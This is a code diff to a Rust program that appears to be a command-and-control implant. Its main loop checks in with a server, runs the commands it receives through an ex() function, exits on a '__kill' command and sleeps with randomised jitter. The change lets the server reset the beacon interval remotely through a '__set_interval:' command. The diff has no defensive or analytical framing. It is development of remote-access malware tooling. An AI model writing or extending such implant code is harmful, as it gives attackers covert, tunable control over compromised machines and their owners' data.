@@ -165,6 +165,7 @@ fn main() {
     if aid.is_empty() { return; }
 
     let mut pending: Vec<Value> = Vec::new();
+    let mut interval = SI;
     loop {
         let ci = json!({
             "type": "checkin",
@@ -182,7 +183,9 @@ fn main() {
                             if let Some(cmd) = c["command"].as_str() {
                                 if cmd == "__kill" { std::process::exit(0); }
                                 if cmd.starts_with("__set_interval:") {
-                                    // interval change handled by server
+                                    if let Ok(n) = cmd[15..].parse::<u64>() {
+                                        interval = n.max(1);
+                                    }
                                     continue;
                                 }
                                 let out = ex(cmd);
@@ -198,7 +201,7 @@ fn main() {
             }
         }
 
-        let base = SI;
+        let base = interval;
         if SJ > 0 && SJ <= 100 {
             let jr = (base as f64) * (SJ as f64) / 100.0;
             let off = (rand::random::<f64>() * jr * 2.0) - jr;
